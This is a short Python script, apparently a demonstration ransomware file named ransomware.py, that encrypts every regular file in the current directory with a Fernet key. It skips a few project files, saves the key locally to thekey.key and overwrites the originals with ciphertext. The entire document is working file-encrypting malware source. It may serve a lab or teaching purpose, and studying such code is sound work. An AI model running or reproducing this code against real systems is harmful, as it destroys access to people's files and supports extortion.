import os
from cryptography.fernet import Fernet

files = []

not_mutable_files = ["LICENSE", "create-vulnerable-files.sh", ".gitignore", "ransomware.py", "README.md", ".git", "thekey.key"]

for file in os.listdir():
  if file in not_mutable_files:
      continue
  if os.path.isfile(file):
    files.append(file)

key = Fernet.generate_key()

with open("thekey.key", "wb") as _key:
  _key.write(key)
   
for file in files:
  with open(file, "rb") as _file: 
    contents = _file.read()
  encrypted_src = Fernet(key).encrypt(contents)
  with open(file, "wb") as __file: 
    __file.write(encrypted_src)
      